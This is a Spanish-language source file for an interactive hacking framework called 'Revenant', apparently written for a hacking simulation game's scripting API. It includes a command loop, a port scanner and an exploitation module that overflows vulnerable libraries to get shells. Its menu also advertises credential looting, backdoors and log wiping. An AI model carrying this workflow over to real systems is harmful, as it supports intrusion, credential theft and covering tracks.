// --- INICIO SUB-MODULO: repl.nini ---
// repl.nini - Bucle Principal Interactivo Revenant v2.0

// Estado Global
enjambre = {}
globals.objetivo_actual = null
estado_activo = verdadero
_historial = []
globals.ultimo_scan = []
globals.modo = "REMOTO"

tarea iniciar_repl:
    mientras estado_activo:
        dibujar_hud_tactico()
        
        p = "<color=#00e5ff>revenant"
        si globals.objetivo_actual:
            p = p + ":" + globals.objetivo_actual
        p = p + ":" + globals.modo + "> "
        
        entrada = pedir(p)
        
        si entrada.trim.len > 0:
            _historial.push(entrada.trim)
        
        entrada = entrada.trim.lower()
        
        // Comandos esenciales
        si entrada == "salir" o entrada == "x" o entrada == "q":
            info("Saliendo...")
            globals.estado_activo = falso
            
        osi entrada == "ayuda" o entrada == "h" o entrada == "?":
            mostrar_ayuda()
            pausa_tactica()
            
        osi entrada == "objetivo" or entrada == "o":
            prompt_objetivo()
            si globals.objetivo_actual:
                modulo_espectro_recon()
                pausa_tactica()
            
        osi entrada.indexOf("objetivo ") == 0 or entrada.indexOf("o ") == 0:
            partes = entrada.split(" ")
            si partes.len >= 2:
                ip = resolver_objetivo(partes[1])
                si ip:
                    globals.objetivo_actual = ip
                    exito("Objetivo: " + globals.objetivo_actual)
                    modulo_espectro_recon()
            pausa_tactica()

        osi entrada == "menu" or entrada == "m":
            mostrar_menu_principal()

        osi entrada == "modo" or entrada == "m":
            cambiar_modo()
            pausa_tactica()

        osi entrada == "recon" or entrada == "r":
            modulo_espectro_recon()
            pausa_tactica()
            
        osi entrada == "asalto" or entrada == "a":
            modulo_asalto_root()
            pausa_tactica()
            
        osi entrada == "vault" or entrada == "v":
            listar_credenciales()
            pausa_tactica()
            
        osi entrada == "intel" or entrada == "i":
            modulo_intel_saquear()
            pausa_tactica()

        osi entrada == "sesiones" or entrada == "ses" or entrada == "s":
            modulo_botnet_menu()
            pausa_tactica()
            
        osi entrada == "lateral" or entrada == "lat" or entrada == "l":
            modulo_lateral_mover()
            pausa_tactica()
            
        osi entrada == "persist" or entrada == "per" or entrada == "pe":
            modulo_persistencia_configurar()
            pausa_tactica()
            
        osi entrada == "limpiar" or entrada == "clean" or entrada == "c":
            modulo_limpieza_ejecutar()
            pausa_tactica()
            
        osi entrada == "historial" or entrada == "history":
            si _historial.len == 0:
                info("Sin comandos.")
            sino:
                i = _historial.len - 1
                cont = 0
                mientras i >= 0 y cont < 10:
                    info("  " + _historial[i])
                    i = i - 1
                    cont = cont + 1
            pausa_tactica()
            
        osi entrada == "":
            // Saltar
            
        sino:
            error("Comando: " + entrada)
            pausa_tactica()

tarea mostrar_ayuda:
    columnas = ["Comando", "Alias", "Que hace"]
    filas = [
        ["objetivo", "o", "Fija un objetivo y escanea automatico"],
        ["modo", "", "Cambia entre LOCAL o REMOTO"],
        ["recon", "r", "Escanea puertos y servicios"],
        ["asalto", "a", "Explota vulnerabilidades y gana acceso"],
        ["vault", "v", "Muestra credenciales guardadas"],
        ["intel", "i", "Extrae info del objetivo (passwd, bancos, etc)"],
        ["sesiones", "ses", "Ver nodos comprometidos"],
        ["lateral", "lat", "Moverse a otros equipos de la red"],
        ["persist", "pe", "Instalar backdoor"],
        ["limpiar", "c", "Borrar logs e huellas"],
        ["ayuda", "h", "Esta ayuda"],
        ["salir", "x", "Salir del framework"],
    ]
    dibujar_tabla_simple("AYUDA - COMANDOS UTILES", columnas, filas)

tarea cambiar_modo:
    si globals.modo == "REMOTO":
        globals.modo = "LOCAL"
        info("Modo cambiado a: LOCAL")
    sino:
        globals.modo = "REMOTO"
        info("Modo cambiado a: REMOTO")

tarea mostrar_menu_principal:
    opciones = [
        {"label": "Fijar Objetivo", "cmd": "o"},
        {"label": "Cambiar Modo (LOCAL/REMOTO)", "cmd": "modo"},
        {"label": "Escanear", "cmd": "r"},
        {"label": "Asaltar", "cmd": "a"},
        {"label": "Inteligencia (saquear)", "cmd": "i"},
        {"label": "Ver Vault (credenciales)", "cmd": "v"},
        {"label": "Sesiones (enjambre)", "cmd": "ses"},
        {"label": "Movimiento Lateral", "cmd": "lat"},
        {"label": "Persistencia (backdoor)", "cmd": "pe"},
        {"label": "Limpiar huellas", "cmd": "c"},
    ]
    
    comando = menu_interactivo("MENU", opciones)
    si comando:
        entrada = comando

// --- FIN SUB-MODULO: repl.nini ---
// --- INICIO SUB-MODULO: modulos/espectro.nini ---
// modulo espectro.nini - RECONOCIMIENTO AVANZADO
// Automatico con la mejor info

tarea espectro_escaneo_completo(host):
    si not host o host == "":
        error("No hay host definido.")
        retornar null
    
    sh = get_shell
    si sh.ping(host) != 1:
        error("Host inalcanzable: " + host)
        retornar null
    
    router = get_router(host)
    si not router:
        error("No se pudo obtener router.")
        retornar null
    
    es_local = es_ip_local(host)
    
    ports = []
    si es_local:
        ports = router.device_ports(host)
    sino:
        ports = router.used_ports
    
    si not ports o ports.len == 0:
        info("No hay puertos abiertos.")
        retornar null
    
    resultados = []
    i = 1
    
    para port en ports:
        port_num = port.port_number
        servicio_completo = router.port_info(port)
        
        // Separar servicio y version
        servicio = servicio_completo
        version = "N/A"
        
        partes_svc = servicio_completo.split(" ")
        si partes_svc.len > 1:
            servicio = partes_svc[0]
            version = partes_svc[1]
        
        estado = "open"
        si port.is_closed y not es_local:
            estado = "closed"
        
        // Obtener IP LAN
        lan_ip = "N/A"
        si es_local:
            lan_ip = host
        sino:
            lan_ip = port.get_lan_ip
        
        resultados.push({
            "id": i,
            "puerto": port_num,
            "servicio": servicio,
            "version": version,
            "estado": estado,
            "lan_ip": lan_ip,
        })
        
        i = i + 1
    
    retornar resultados

tarea espectro_mostrar_tabla(resultados):
    print("")
    info("RESULTADOS DEL ESCANEO:")
    print("")
    
    // Encabezado
    print("  ID  Puerto  Estado  Servicio            Version  LAN IP")
    print("  --- ------  ------  ------------------ -------- ---------------")
    
    para r en resultados:
        id_str = str(r.id)
        puerto_str = str(r.puerto)
        estado_str = r.estado
        servicio_str = r.servicio
        version_str = r.version
        lan_str = r.lan_ip
        
        // Alinear
        id_str = id_str + " " * (3 - id_str.len)
        puerto_str = puerto_str + " " * (6 - puerto_str.len)
        estado_str = estado_str + " " * (6 - estado_str.len)
        servicio_str = servicio_str + " " * (18 - servicio_str.len)
        version_str = version_str + " " * (8 - version_str.len)
        
        // Color segun estado
        color_estado = ""
        si estado_str == "closed":
            color_estado = "<color=#ff3131>"
        
        print("  " + id_str + "  " + puerto_str + "  " + color_estado + estado_str + "</color>  " + servicio_str + "  " + version_str + "  " + lan_str)
    
    print("")

tarea modulo_espectro_recon:
    si globals.objetivo_actual == null:
        error("No hay objetivo. Usa 'objetivo <ip>'")
        retornar
    
    host = globals.objetivo_actual
    
    info("Escaneando " + host + "...")
    
    resultados = espectro_escaneo_completo(host)
    
    si resultados:
        globals.ultimo_scan = resultados
        espectro_mostrar_tabla(resultados)
        
        es_local = es_ip_local(host)
        modo_actual = "REMOTO"
        si es_local:
            modo_actual = "LOCAL"
        
        info("Modo: " + modo_actual + " | Puertos: " + str(resultados.len))
    sino:
        error("Sin resultados.")

tarea es_ip_local(ip):
    si not ip: retornar falso
    si ip == "127.0.0.1": retornar verdadero
    
    comp = get_shell.host_computer
    local_ip = comp.local_ip
    
    partes_local = local_ip.split(".")
    partes_ip = ip.split(".")
    
    si partes_local.len < 3 o partes_ip.len < 3: retornar falso
    
    red_local = partes_local[0] + "." + partes_local[1] + "." + partes_local[2]
    red_ip = partes_ip[0] + "." + partes_ip[1] + "." + partes_ip[2]
    
    retornar red_local == red_ip

// --- FIN SUB-MODULO: modulos/espectro.nini ---
// --- INICIO SUB-MODULO: modulos/asalto.nini ---
// modulo asalto.nini - Explotacion con seleccion de puerto

tarea modulo_asalto_root:
    si globals.objetivo_actual == null:
        error("No hay objetivo. Usa 'objetivo <ip>'")
        retornar
    
    // Ver si hay scan previo
    si globals.ultimo_scan.len == 0:
        info("Escaneando objetivo...")
        modulo_espectro_recon()
    
    // Pedir seleccion directamente
    sel = pedir("Puerto (ID, 0=router, Enter=todos): ")
    
    port_int = 0
    puerto_seleccionado = null
    
    si sel.len > 0:
        si sel == "0":
            port_int = 0
            info("Atacando router (puerto 0)...")
        sino:
            sel_int = val(sel)
            si sel_int > 0 y sel_int <= globals.ultimo_scan.len:
                puerto_seleccionado = globals.ultimo_scan[sel_int - 1]
                port_int = puerto_seleccionado.puerto
                info("Atacando puerto " + str(port_int) + "...")
            sino:
                port_int = val(sel)
                info("Atacando puerto " + str(port_int) + "...")
    sino:
        info("Atacando todos los puertos...")
        port_int = null
    
    // Verificar modo
    si globals.modo == "LOCAL":
        info("Modo LOCAL - escaneando librerias...")
        ataque_local()
    sino:
        ataque_remoto(port_int)

tarea ataque_local:
    comp = get_shell.host_computer
    
    info("Escaneando librerias en /lib...")
    
    lib_folder = comp.File("/lib")
    si not lib_folder:
        error("No se pudo acceder a /lib")
        retornar
    
    libs = []
    para f en lib_folder.get_files:
        si f.name.indexOf(".so") != null:
            libs.push(f)
    
    si libs.len == 0:
        error("No hay librerias.")
        retornar
    
    info("Librerias: " + str(libs.len))
    
    metax = include_lib("/lib/metaxploit.so")
    si not metax:
        error("Metaxploit no disponible")
        retornar
    
    para lib_file en libs:
        info("Probando: " + lib_file.name)
        
        lib = metax.load(lib_file.path)
        si lib:
            vulns = metax.scan(lib)
            si vulns.len > 0:
                info("  Vulns: " + str(vulns.len))
                para v en vulns:
                    res = lib.overflow(vulns[0], "")
                    si res:
                        exito("ACCESO OBTENIDO!")
                        enjambre[globals.objetivo_actual] = res
                        retornar
    
    error("Sin vulnerabilidades.")

tarea ataque_remoto(port_int):
    host = globals.objetivo_actual
    
    es_router = falso
    r = obtener_router_objetivo(host)
    si r y port_int == 0:
        es_router = verdadero
    
    lan_target = null
    si es_router:
        alerta("ROUTER DETECTADO!")
        opcion = pedir("Saltar a IP interna? [s/n]: ")
        si opcion.lower() == "s":
            lan_target = pedir("IP interna: ")
            info("Saltando a: " + lan_target)
    
    // Cache
    lib_info = obtener_info_libreria(host, port_int)
    
    vulns_cache = []
    si lib_info:
        vulns_cache = obtener_vulnerabilidades(lib_info.lib_name, lib_info.version)
    
    si vulns_cache.len > 0:
        exito("Cache hit: " + lib_info.lib_name)
        para v en vulns_cache:
            info("Explotando: " + v.mem)
            sesion = explotar_directo(lib_info.metalib, v.mem, v.pass, lan_target)
            si typeof(sesion) == "shell" o typeof(sesion) == "computer":
                exito("ACCESO OBTENIDO!")
                enjambre[host] = sesion
                retornar
    
    // Normal
    info("Buscando vulnerabilidades...")
    vuln = buscar_vulnerabilidad(host, port_int)
    
    si vuln:
        info("Vulnerabilidades: " + str(vuln.v_list.len))
        
        para v en vuln.v_list:
            cachear_vulnerabilidad(vuln.metalib.lib_name, vuln.metalib.version, v.mem, v.pass)
        
        sesion = explotar(vuln, null, lan_target)
        
        si typeof(sesion) == "shell" o typeof(sesion) == "computer":
            exito("ACCESO OBTENIDO!")
            enjambre[host] = sesion
        sino:
            error("Ataque fallido.")
    sino:
        error("Sin vulnerabilidades.")

tarea obtener_router_objetivo(ip):
    r = get_router(ip)
    si r y r.public_ip == ip:
        retornar r
    retornar null

// --- FIN SUB-MODULO: modulos/asalto.nini ---
